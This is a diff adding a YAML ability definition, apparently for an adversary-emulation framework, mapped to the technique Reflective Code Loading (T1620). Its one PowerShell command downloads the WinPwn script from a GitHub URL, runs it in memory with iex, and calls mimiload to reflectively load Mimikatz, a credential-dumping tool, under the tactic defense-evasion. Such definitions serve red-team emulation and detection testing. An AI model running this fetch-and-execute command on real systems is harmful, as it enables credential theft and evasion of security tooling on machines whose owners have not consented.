@@ -1,0 +1,18 @@
+- description: Reflectively load Mimik@tz into memory technique via function of WinPwn
+  id: aa758d17faffeeb69c56481340891859
+  name: WinPwn - Reflectively load Mimik@tz into memory
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          mimiload -consoleoutput -noninteractive
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1620
+    name: Reflective Code Loading
